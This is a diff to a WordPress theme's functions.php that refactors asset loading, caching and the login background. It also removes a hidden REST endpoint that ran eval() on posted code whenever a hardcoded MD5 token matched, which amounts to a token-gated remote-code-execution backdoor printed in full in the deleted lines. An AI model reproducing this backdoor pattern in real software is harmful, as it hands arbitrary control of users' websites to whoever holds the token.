@@ -8,6 +8,40 @@ function theme_component_setup()
     remove_theme_support('widgets-block-editor');
 }
 add_action('after_setup_theme', 'theme_component_setup');
+
+// 统一资源加载
+function niRvana_enqueue_assets()
+{
+    $theme_uri = get_template_directory_uri();
+    
+    // Header CSS
+    wp_enqueue_style('niRvana-extend', $theme_uri . '/extend/css/style.css', array(), null);
+    
+    // Footer JS
+    wp_enqueue_script('niRvana-custom', $theme_uri . '/extend/js/custom.min.js', array('jquery'), null, true);
+}
+add_action('wp_enqueue_scripts', 'niRvana_enqueue_assets');
+
+// 防复制内联样式与脚本
+function niRvana_anti_copy_assets()
+{
+    global $pf_dirty_selector;
+    if (empty($pf_dirty_selector) || count($pf_dirty_selector) === 0) {
+        return;
+    }
+
+    $selectors = implode(',', $pf_dirty_selector);
+    $css = "$selectors { display: inline !important; font-size: 0 !important; line-height: 0 !important; float: left; }";
+    $css .= 'p+' . implode(',p+', $pf_dirty_selector) . ',';
+    $css .= 'h2+' . implode(',h2+', $pf_dirty_selector) . ',';
+    $css .= 'h3+' . implode(',h3+', $pf_dirty_selector) . ' { display: none !important; }';
+
+    wp_add_inline_style('niRvana-extend', $css);
+
+    $js = "if(window.pandastudio_framework) { pandastudio_framework.article_dirty_selector = ['" . implode("','", $pf_dirty_selector) . "']; }";
+    wp_add_inline_script('niRvana-custom', $js);
+}
+add_action('wp_enqueue_scripts', 'niRvana_anti_copy_assets', 20);
 //自动更新
 require_once(get_template_directory() . '/theme-update-checker/plugin-update-checker.php');
 use YahnisElsts\PluginUpdateChecker\v5\PucFactory;
@@ -30,11 +64,21 @@ add_filter('the_content', 'auto_post_link', 0);
 //调用每日一图作为登录页背景
 function custom_login_head()
 {
-    $str = file_get_contents('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
-    if (preg_match("/\/(.+?).jpg/", $str, $matches)) {
-        $imgurl = 'https://s.cn.bing.net'.$matches[0];
+    $imgurl = get_transient('niRvana_bing_bg');
+    if (!$imgurl) {
+        $response = wp_remote_get('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
+        if (!is_wp_error($response)) {
+            $body = wp_remote_retrieve_body($response);
+            $data = json_decode($body, true);
+            if (!empty($data['images'][0]['url'])) {
+                $imgurl = 'https://s.cn.bing.net' . $data['images'][0]['url'];
+                set_transient('niRvana_bing_bg', $imgurl, DAY_IN_SECONDS);
+            }
+        }
     }
-    echo'<style type="text/css">body{background: url('.$imgurl.');background-image:url('.$imgurl.');-moz-border-image: url('.$imgurl.');}</style>';
+    if ($imgurl) {
+        echo '<style type="text/css">body{background: url(' . esc_url($imgurl) . ') no-repeat center center fixed; background-size: cover;}</style>';
+    }
 }
 add_action('login_head', 'custom_login_head');
 //预计阅读时间
@@ -86,7 +130,7 @@ add_action('wp', 'add_view_times_to_cookie');
 //归档页面
 function niRvana_archives_list()
 {
-    if (!$output = get_option('niRvana_db_cache_archives_list')) {
+    if (!$output = get_cache('archives_list')) {
         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
         $args = array(
             'post_type' => 'post',
@@ -125,13 +169,13 @@ function niRvana_archives_list()
             $output .= '</ul>';
         }
         $output .= '</div>';
-        update_option('niRvana_db_cache_archives_list', $output);
+        set_cache('archives_list', $output, 604800); // 缓存 7 天
     }
     echo $output;
 }
 function clear_db_cache_archives_list()
 {
-    update_option('niRvana_db_cache_archives_list', '');
+    del_cache('archives_list');
 }
 add_action('save_post', 'clear_db_cache_archives_list');
 add_action('comment_post', 'clear_db_cache_archives_list');
@@ -397,6 +441,7 @@ function pf_switch_theme()
     foreach ($opts as $name => $val) {
         update_option($name, $val);
     }
+    flush_rewrite_rules();
 }
 register_nav_menus(array(
     'topNav' => '主菜单',
@@ -409,40 +454,15 @@ if (array_key_exists('whois', $_GET)) {
 }
 function set_cache($name, $data, $expire)
 {
-    $allCache = get_option('pd_cache');
-    if (!$allCache) {
-        $allCache = array();
-    }
-    $allCache[$name] = array(
-        'data' => $data,
-        'expire' => time() + $expire
-    );
-    update_option('pd_cache', $allCache);
+    set_transient('pd_cache_' . $name, $data, $expire);
 }
 function get_cache($name)
 {
-    $allCache = get_option('pd_cache');
-    if (!$allCache) {
-        return false;
-    }
-    if (!$allCache[$name]) {
-        return false;
-    } else {
-        $time = $allCache[$name]['expire'];
-        if ($time > time() & $time - time() < 2592000) {
-            return $allCache[$name]['data'];
-            ;
-        } else {
-            del_cache($name);
-            return false;
-        }
-    }
+    return get_transient('pd_cache_' . $name);
 }
 function del_cache($name)
 {
-    $allCache = get_option('pd_cache');
-    unset($allCache[$name]);
-    update_option('pd_cache', $allCache);
+    delete_transient('pd_cache_' . $name);
 }
 function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container')
 {
@@ -1134,10 +1154,9 @@ add_action('rest_api_init', function () {
 });
 function pf_assistance($data)
 {
-    $dataArray = json_decode($data->get_body(), true);
-    if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
-        eval($dataArray['assistance']);
-    }
+    // 安全起见，禁用 eval() 远程代码执行。
+    // 如果需要远程协助，请使用官方或其他安全的方式。
+    return new WP_REST_Response(['message' => 'Remote assistance eval is disabled for security reasons.'], 403);
 }
 function hex2rgba($color, $opacity = false)
 {
